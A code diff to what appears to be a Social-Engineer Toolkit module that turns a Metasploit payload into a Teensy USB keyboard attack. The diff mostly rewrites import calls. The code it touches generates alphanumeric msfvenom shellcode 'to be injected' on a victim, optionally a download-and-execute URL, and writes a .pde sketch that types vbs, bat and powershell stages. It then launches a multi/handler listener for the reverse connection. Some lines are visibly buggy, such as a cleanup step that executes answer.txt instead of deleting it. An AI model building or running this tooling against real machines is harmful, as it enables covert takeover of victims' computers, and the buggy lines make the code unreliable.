@@ -4,7 +4,8 @@ import os
 import subprocess
 import sys
 
-import src.core.setcore as core
+#import src.core.setcore as core
+from src.core.setcore import *
 from src.core.dictionaries import ms_payload
 from src.core.menu.text import payload_menu_2, payload_menu_2_text
 
@@ -15,14 +16,14 @@ try:
 except NameError:
     pass
 
-##########################################################################
+###########################################################################################################
 #
 #                               BSIDES LV EXE to Teensy Creator
 #
 #                                by Josh Kelley (@winfang98)
 #                                Dave Kennedy (@hackingdave)
 #
-##########################################################################
+###########################################################################################################
 
 ##########################################################################
 ##########################################################################
@@ -30,14 +31,14 @@ except NameError:
 #
 # grab the interface ip address
 #
-ipaddr = core.grab_ipaddress()
+ipaddr = grab_ipaddress()
 
 #
 # metasploit_path here
 #
 
 
-msf_path = core.meta_path()
+msf_path = meta_path()
 if msf_path == "": msf_path = "/usr/bin/msfconsole"
 else: msf_path = msf_path + "/msfconsole"
 
@@ -195,11 +196,11 @@ if not os.path.isfile(msf_path):
 #        USER INPUT: SHOW PAYLOAD MENU 2          #
 ###################################################
 
-show_payload_menu2 = core.create_menu(payload_menu_2_text, payload_menu_2)
-payload = (input(core.setprompt(["14"], "")))
+show_payload_menu2 = create_menu(payload_menu_2_text, payload_menu_2)
+payload = (input(setprompt(["14"], "")))
 
 if payload == "exit":
-    core.exit_set()
+    exit_set()
 
 # if its default then select meterpreter
 if payload == "":
@@ -212,14 +213,14 @@ payload = ms_payload(payload)
 url = ""
 port = ""
 if payload == "windows/download_exec":
-    url = input(core.setprompt(["6"], "The URL with the payload to download and execute"))
+    url = input(setprompt(["6"], "The URL with the payload to download and execute"))
     url = "set URL " + url
 
 # try except for Keyboard Interrupts
 try:
     # grab port number
     while True:
-        port = input(core.setprompt(["6"], "Port to listen on [443]"))
+        port = input(setprompt(["6"], "Port to listen on [443]"))
         # assign port if enter is specified
         if port == "":
             port = 443
@@ -250,7 +251,7 @@ except KeyboardInterrupt:
 
 print("   [*] Generating alpha_mixed shellcode to be injected after shellexec has been deployed on victim...")
 # grab msfvenom alphanumeric shellcode to be inserted into shellexec
-proc = subprocess.Popen("{0} -p {1} EXITFUNC=thread LHOST={2} LPORT={3} {4} --format raw -e x86/alpha_mixed BufferRegister=EAX".format(os.path.join(core.meta_path() + "msfvenom"),
+proc = subprocess.Popen("{0} -p {1} EXITFUNC=thread LHOST={2} LPORT={3} {4} --format raw -e x86/alpha_mixed BufferRegister=EAX".format(os.path.join(meta_path() + "msfvenom"),
                                                                                                                                   payload,
                                                                                                                                   ipaddr,
                                                                                                                                   port,
@@ -261,7 +262,7 @@ proc = subprocess.Popen("{0} -p {1} EXITFUNC=thread LHOST={2} LPORT={3} {4} --fo
 alpha_payload = proc.stdout.read()
 # generate a random filename this is going to be needed to read 150 bytes
 # in at a time
-random_filename = core.generate_random_string(10, 15)
+random_filename = generate_random_string(10, 15)
 # prep a file to write
 with open(random_filename, "wb") as filewrite:
     # write the hex to random file
@@ -335,9 +336,9 @@ while rev_counter != counter:
         output_variable += ",\n"
 
 # vbs filename
-vbs = core.generate_random_string(10, 15) + ".vbs"
+vbs = generate_random_string(10, 15) + ".vbs"
 # .batch filename
-bat = core.generate_random_string(10, 15) + ".bat"
+bat = generate_random_string(10, 15) + ".bat"
 
 # write the rest of the teensy code
 output_variable += ("""
@@ -444,15 +445,15 @@ Keyboard.send_now();
 }}""".format(random_filename=random_filename, powershell_command=powershell_command, vbs=vbs, bat=bat, alpha_payload=alpha_payload))
 # delete temporary file
 subprocess.Popen("rm {0} 1> /dev/null 2>/dev/null".format(random_filename), shell=True).wait()
-print("   [*] Binary to Teensy file exported as {0}".format(os.path.join(core.setdir + "/reports/binary2teensy.pde")))
+print("[*] Binary to Teensy file exported as {0}".format(os.path.join(setdir + "reports/binary2teensy.pde")))
 # write the teensy.pde file out
-with open(os.path.join(core.setdir + "/reports/binary2teensy.pde"), 'w') as filewrite:
+with open(os.path.join(setdir + "/reports/binary2teensy.pde"), 'w') as filewrite:
     # write the teensy.pde file out
     filewrite.write(output_variable)
 
 print("   [*] Generating a listener...")
 # create our metasploit answer file
-with open(os.path.join(core.setdir + "answer.txt", "w")) as filewrite:
+with open(os.path.join(setdir + "answer.txt", "w")) as filewrite:
     filewrite.write("use multi/handler\n"
                     "set payload {0}\n"
                     "set LHOST {1}\n"
@@ -460,9 +461,9 @@ with open(os.path.join(core.setdir + "answer.txt", "w")) as filewrite:
                     "{3}\n"
                     "exploit -j".format(payload, ipaddr, port, url))
 # spawn a multi/handler listener
-subprocess.Popen("msfconsole -r {0}".format(os.path.join(core.setdir + "answer.txt")), shell=True).wait()
+subprocess.Popen("msfconsole -r {0}".format(os.path.join(setdir + "answer.txt")), shell=True).wait()
 print("   [*] Housekeeping old files...")
 # if our answer file is still there (which it should be), then remove it
-if os.path.isfile(os.path.join(core.setdir + "answer.txt")):
+if os.path.isfile(os.path.join(setdir + "answer.txt")):
     # remove the old file, no longer used once we've exited
-    subprocess.Popen(os.path.join(core.setdir + "answer.txt"), shell=True).wait()
+    subprocess.Popen(os.path.join(setdir + "answer.txt"), shell=True).wait()
